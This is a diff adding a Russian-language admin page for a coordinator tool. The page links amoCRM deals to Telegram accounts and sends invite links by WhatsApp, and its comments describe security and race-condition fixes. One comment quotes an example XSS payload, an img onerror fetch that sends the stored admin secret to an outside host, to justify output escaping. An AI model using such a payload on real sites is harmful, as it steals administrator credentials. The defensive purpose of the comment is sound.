@@ -1,0 +1,371 @@
+<!doctype html>
+<html lang="ru">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Привязка участников — ABC Universe</title>
+<link rel="stylesheet" href="css/styles.css" />
+<style>
+/* Coordinator tool, not the Mini App -- wider layout than the app's own
+   460px phone-width container (same approach as admin-events.html). */
+.app{max-width:640px}
+.field{margin-bottom:14px}
+.field label{display:block;font-size:13px;font-weight:700;margin-bottom:6px;color:var(--navy)}
+.field input{
+  width:100%;border:1px solid var(--line);border-radius:10px;padding:10px 12px;
+  font-family:inherit;font-size:14px;background:#fff;
+}
+.search-box{margin-bottom:10px}
+.deal-list{max-height:320px;overflow-y:auto;border:1px solid var(--line);border-radius:10px;padding:4px}
+.deal-row{display:flex;align-items:center;gap:10px;padding:9px 10px;border-bottom:1px solid var(--line);cursor:pointer}
+.deal-row:last-child{border-bottom:0}
+.deal-row:hover{background:rgba(15,35,68,.03)}
+.deal-id{margin-left:auto;font-size:11px;color:var(--muted)}
+#gate{max-width:340px;margin:80px auto;padding:0 16px}
+#result{margin-top:14px}
+#result.ok{color:var(--ok)}
+#result.err{color:var(--danger)}
+.link-box{display:flex;gap:8px;margin-top:8px}
+.link-box input{flex:1;font-size:13px}
+#wa-btn{text-decoration:none;background:#25d366}
+
+/* Кнопка выхода: раньше выйти из админки было нельзя вообще — пароль оставался
+   в браузере до ручной чистки. Держим её неприметной, но всегда на виду. */
+.logout-btn{margin-left:auto;background:none;border:1px solid rgba(0,0,0,.18);
+  border-radius:8px;padding:6px 12px;font:inherit;font-size:13px;color:inherit;
+  cursor:pointer;opacity:.7}
+.logout-btn:hover{opacity:1}
+.top{display:flex;align-items:center;gap:12px}
+</style>
+</head>
+<body>
+
+<div id="gate">
+<div class="card">
+<h2>Вход</h2>
+<div class="field">
+<label for="secret-input">Секретный код</label>
+<input id="secret-input" type="password" placeholder="ADMIN_SECRET" />
+</div>
+<button class="btn" id="gate-submit">Войти</button>
+<div class="sub" style="margin-top:10px">Тот же код, что и для приглашений на мероприятия.</div>
+</div>
+</div>
+
+<div class="app" id="main" style="display:none">
+<header class="top">
+<div class="brand"><b>Привязка участника к приложению</b></div>
+<button class="logout-btn" id="logout-btn" type="button">Выйти</button>
+</header>
+<main class="content">
+<div class="card">
+<h2>Выбрать сделку из списка</h2>
+<div class="sub" style="margin-bottom:12px">Показаны сделки, уже синхронизированные из amoCRM, но ещё не привязанные ни к одному Telegram-аккаунту. Нажмите на сделку — ссылка сгенерируется сразу.</div>
+<div class="search-box">
+<input id="search-deals" placeholder="Поиск по имени…" />
+</div>
+<button class="btn secondary" id="refresh-btn" style="margin-bottom:10px">Обновить список</button>
+<div class="deal-list" id="deal-list"></div>
+</div>
+
+<div class="card">
+<h2>Или ввести ID сделки вручную</h2>
+<div class="sub" style="margin-bottom:12px">Если сделка совсем новая и ещё не появилась в списке выше (webhook из amoCRM ещё не сработал) — ID сделки видно в адресе сделки в amoCRM, например .../leads/detail/<b>47762837</b>.</div>
+<div class="field">
+<label for="manual-deal-id">ID сделки</label>
+<input id="manual-deal-id" placeholder="47762837" />
+</div>
+<button class="btn" id="manual-submit">Создать ссылку</button>
+</div>
+
+<div class="card" id="result-card" style="display:none">
+<h2 id="result-title">Готово</h2>
+<div id="result"></div>
+</div>
+</main>
+</div>
+
+<script type="module">
+/**
+ * ЭКРАНИРОВАНИЕ ВЫВОДА (02.09.2026).
+ *
+ * Всё, что приходит с бэкенда, вставлялось в страницу через innerHTML как есть.
+ * Часть этих данных вводит не координатор и не amoCRM, а сам студент: имя
+ * участника берётся из его профиля в Telegram (ensureParticipantRow_ в Api.gs).
+ *
+ * Чем это грозило. Человек ставит себе в Telegram имя вида
+ *   <img src=x onerror="fetch('https://чужой-сервер/?s='+localStorage.wtusa_admin_secret)">
+ * и один раз открывает Mini App — ссылка на бота публична, белого списка нет.
+ * Как только координатор откроет эту страницу, код выполнится в его браузере и
+ * утащит пароль администратора. А с этим паролем можно рассылать произвольные
+ * сообщения на любые номера с рабочего WhatsApp-канала компании и привязывать
+ * свой Telegram к чужим сделкам.
+ *
+ * esc() превращает пять символов, значимых для HTML, в безопасные сущности.
+ * Применять на КАЖДОЙ подстановке чужих данных внутри innerHTML, включая
+ * значения атрибутов (кавычки закрываются тем же способом).
+ */
+function esc(value) {
+  return String(value === null || value === undefined ? "" : value)
+    .replace(/&/g, "&amp;")
+    .replace(/</g, "&lt;")
+    .replace(/>/g, "&gt;")
+    .replace(/"/g, "&quot;")
+    .replace(/'/g, "&#39;");
+}
+
+import { BACKEND_URL } from "./js/services/config.js";
+
+/**
+ * ГДЕ ЛЕЖИТ ПАРОЛЬ (02.09.2026).
+ *
+ * Был localStorage — хранилище без срока жизни: пароль оставался в браузере
+ * навсегда, кнопки «Выйти» не было ни на одной странице, и на общем офисном
+ * компьютере любой, кто открывал адрес, сразу оказывался внутри. Удалить
+ * сохранённый пароль можно было только через инструменты разработчика.
+ *
+ * Стало sessionStorage — то же самое, но привязанное ко вкладке: закрыли
+ * вкладку, и пароль исчез. В пределах рабочего сеанса ничего не меняется,
+ * перезаходить не нужно. Плюс появилась кнопка «Выйти».
+ *
+ * Это не отменяет главного правила: пароль всё ещё уходит в адресе запроса
+ * (см. Api.gs), поэтому попадает в журнал выполнений Apps Script. Полностью
+ * это чинится переносом секрета в тело POST-запроса — отдельная правка.
+ */
+const SECRET_KEY = "wtusa_admin_secret";
+const gateEl = document.getElementById("gate");
+const mainEl = document.getElementById("main");
+
+let deals = []; // { dealId, name }
+
+function secret() {
+  return sessionStorage.getItem(SECRET_KEY) || "";
+}
+
+async function adminGet(action, extraParams) {
+  const params = new URLSearchParams({ action, secret: secret(), ...(extraParams || {}) });
+  const resp = await fetch(`${BACKEND_URL}?${params.toString()}`, { method: "GET" });
+  const json = await resp.json();
+  if (json.error) throw new Error(json.error);
+  return json;
+}
+
+async function adminPost(action, payload) {
+  const params = new URLSearchParams({ action, secret: secret() });
+  const resp = await fetch(`${BACKEND_URL}?${params.toString()}`, {
+    method: "POST",
+    headers: { "Content-Type": "text/plain;charset=utf-8" }, // same CORS workaround as the app itself
+    body: JSON.stringify(payload || {}),
+  });
+  const json = await resp.json();
+  if (json.error) throw new Error(json.error);
+  return json;
+}
+
+function renderDeals(filterText) {
+  const listEl = document.getElementById("deal-list");
+  const q = (filterText || "").trim().toLowerCase();
+  const filtered = q ? deals.filter((d) => d.name.toLowerCase().includes(q) || d.dealId.includes(q)) : deals;
+  listEl.innerHTML =
+    filtered
+      .map(
+        (d) => `
+      <div class="deal-row" data-deal-id="${esc(d.dealId)}" data-deal-name="${esc(d.name)}">
+        <span>${esc(d.name)}</span>
+        <span class="deal-id">#${esc(d.dealId)}</span>
+      </div>`
+      )
+      .join("") || `<div class="sub" style="padding:12px">Непривязанных сделок не найдено.</div>`;
+  listEl.querySelectorAll(".deal-row").forEach((row) => {
+    row.addEventListener("click", () => createLinkFor(row.dataset.dealId, row.dataset.dealName));
+  });
+}
+
+async function loadDeals() {
+  const listEl = document.getElementById("deal-list");
+  listEl.innerHTML = `<div class="sub" style="padding:12px">Загрузка…</div>`;
+  try {
+    deals = await adminGet("adminListUnlinkedDeals");
+    renderDeals(document.getElementById("search-deals").value);
+  } catch (err) {
+    listEl.innerHTML = `<div class="sub" style="padding:12px;color:var(--danger)">Не удалось загрузить список: ${esc(err.message)}</div>`;
+  }
+}
+
+function waMessageText(link, name) {
+  const greeting = name ? `Здравствуйте, ${name}!` : "Здравствуйте!";
+  return (
+    `${greeting} Вот ссылка для подключения к приложению ABC Universe — ` +
+    `откройте её в Telegram, и всё привяжется автоматически:\n${link}`
+  );
+}
+
+// ЗАЩИТА ОТ ПЕРЕПУТАННЫХ ОТВЕТОВ (02.09.2026).
+//
+// Что ломалось. Имя ставилось в карточку сразу, а ссылка и телефон — после
+// ответа сервера. Координатор кликает сделку A, ответ задерживается, он
+// кликает B. Ответ B приходит первым, потом приходит ответ A и перезаписывает
+// карточку. На экране заголовок «Ссылка для: B», а кнопка отправляет ссылку
+// сделки A на номер клиента A. Внешне это неотличимо от нормальной работы:
+// координатор уверен, что работает с B, B не получает ничего, а A получает
+// ссылку не тогда, когда планировалось.
+//
+// Лечение стандартное: каждому запросу — свой номер, и ответ применяется,
+// только если он всё ещё самый свежий.
+let номерЗапроса = 0;
+
+async function createLinkFor(dealId, name) {
+  const мой = ++номерЗапроса;
+  const актуален = () => мой === номерЗапроса;
+  const resultCard = document.getElementById("result-card");
+  const resultTitle = document.getElementById("result-title");
+  const resultEl = document.getElementById("result");
+  resultCard.style.display = "block";
+  resultTitle.textContent = name ? `Ссылка для: ${name}` : "Ссылка";
+  resultEl.className = "";
+  resultEl.textContent = "Генерирую…";
+  resultCard.scrollIntoView({ behavior: "smooth", block: "nearest" });
+  try {
+    const res = await adminGet("adminCreateLink", { dealId: String(dealId) });
+    if (!актуален()) return; // пока ждали, координатор выбрал другую сделку
+    resultEl.className = "ok";
+    const waBlock = res.phone
+      ? `<button class="btn" id="wa-btn" type="button">Отправить в WhatsApp</button>
+         <div class="sub" style="margin:8px 0">Сообщение уйдёт клиенту тем же каналом WhatsApp, что и вся переписка в amoCRM. Или скопируйте ссылку вручную:</div>`
+      : `<div class="sub" style="margin-bottom:8px">В amoCRM не нашёлся номер телефона для этой сделки — отправьте ссылку вручную:</div>`;
+    resultEl.innerHTML = `
+      ${waBlock}
+      <div class="link-box">
+        <input type="text" readonly value="${esc(res.link)}" id="link-output" />
+        <button class="btn secondary" id="copy-btn" type="button">Скопировать</button>
+      </div>`;
+    document.getElementById("copy-btn").addEventListener("click", async () => {
+      const input = document.getElementById("link-output");
+      input.select();
+      try {
+        await navigator.clipboard.writeText(res.link);
+        document.getElementById("copy-btn").textContent = "Скопировано ✓";
+      } catch {
+        // clipboard API unavailable (e.g. non-HTTPS/older browser) -- the
+        // text is still selected above, so a manual Cmd/Ctrl+C still works.
+      }
+    });
+    const waBtn = document.getElementById("wa-btn");
+    if (waBtn) {
+      waBtn.addEventListener("click", async () => {
+        // ПОДТВЕРЖДЕНИЕ ПЕРЕД ОТПРАВКОЙ (02.09.2026). Раньше один клик — и
+        // сообщение ушло реальному клиенту: без подтверждения, без показа
+        // номера и без показа текста. Отозвать нельзя — ссылка живёт 72 часа,
+        // снять её можно только правкой листа LinkTokens руками. Номер при
+        // этом берётся из контакта сделки в amoCRM, а это часто телефон
+        // родителя — координатор об этом не догадывался.
+        const текст = waMessageText(res.link, name);
+        const кому = name ? `${name} (сделка #${dealId})` : `сделка #${dealId}`;
+        const ок = window.confirm(
+          "Отправить сообщение?\n\n" +
+          "Кому: " + кому + "\n" +
+          "Номер: " + res.phone + "\n\n" +
+          "Текст:\n" + текст + "\n\n" +
+          "Отменить отправку после нажатия будет нельзя."
+        );
+        if (!ок) return;
+        waBtn.disabled = true;
+        waBtn.textContent = "Отправляю…";
+        try {
+          await adminPost("adminSendWhatsApp", { phone: res.phone, text: текст });
+          waBtn.textContent = "Отправлено ✓";
+        } catch (err) {
+          waBtn.disabled = false;
+          waBtn.textContent = "Отправить в WhatsApp";
+          alert("Не удалось отправить через WhatsApp: " + (err.message || "попробуйте ещё раз") + "\n\nСсылку можно скопировать вручную ниже.");
+        }
+      });
+    }
+  } catch (err) {
+    if (!актуален()) return;
+    resultEl.className = "err";
+    resultEl.textContent = "Ошибка: " + (err.message || "попробуйте ещё раз");
+  }
+}
+
+let entering = false; // guards against a double-click/double-Enter firing tryEnter() twice
+let mainLoaded = false; // guards against loadMain() ever running (and re-binding listeners) twice
+
+async function init() {
+  const gateSubmit = document.getElementById("gate-submit");
+  const secretInput = document.getElementById("secret-input");
+
+  async function tryEnter() {
+    if (entering) return;
+    const value = secretInput.value.trim();
+    if (!value) return;
+    entering = true;
+    gateSubmit.disabled = true;
+    try {
+      sessionStorage.setItem(SECRET_KEY, value);
+      await loadMain();
+    } finally {
+      entering = false;
+      gateSubmit.disabled = false;
+    }
+  }
+  gateSubmit.addEventListener("click", tryEnter);
+  secretInput.addEventListener("keydown", (e) => {
+    if (e.key === "Enter") tryEnter();
+  });
+
+  if (secret()) {
+    await loadMain();
+  }
+}
+
+async function loadMain() {
+  if (mainLoaded) {
+    gateEl.style.display = "none";
+    mainEl.style.display = "block";
+    return;
+  }
+  try {
+    deals = await adminGet("adminListUnlinkedDeals");
+  } catch (err) {
+    sessionStorage.removeItem(SECRET_KEY);
+    alert("Не удалось войти: " + (err.message || "проверьте код"));
+    return;
+  }
+
+  mainLoaded = true;
+  gateEl.style.display = "none";
+  mainEl.style.display = "block";
+
+  renderDeals("");
+
+  let searchDebounce = null;
+  document.getElementById("search-deals").addEventListener("input", (e) => {
+    clearTimeout(searchDebounce);
+    const value = e.target.value;
+    searchDebounce = setTimeout(() => renderDeals(value), 200);
+  });
+  document.getElementById("refresh-btn").addEventListener("click", loadDeals);
+
+  document.getElementById("manual-submit").addEventListener("click", () => {
+    const id = document.getElementById("manual-deal-id").value.trim();
+    if (!id) return;
+    createLinkFor(id, null);
+  });
+}
+
+init();
+
+  // Выход: стираем пароль и возвращаем страницу к экрану входа. Перезагрузка —
+  // самый честный способ сбросить всё загруженное состояние (списки участников,
+  // сделок, результаты), чтобы после выхода на экране не осталось чужих данных.
+  const logoutBtn = document.getElementById("logout-btn");
+  if (logoutBtn) {
+    logoutBtn.addEventListener("click", () => {
+      sessionStorage.removeItem(SECRET_KEY);
+      location.reload();
+    });
+  }
+</script>
+</body>
+</html>
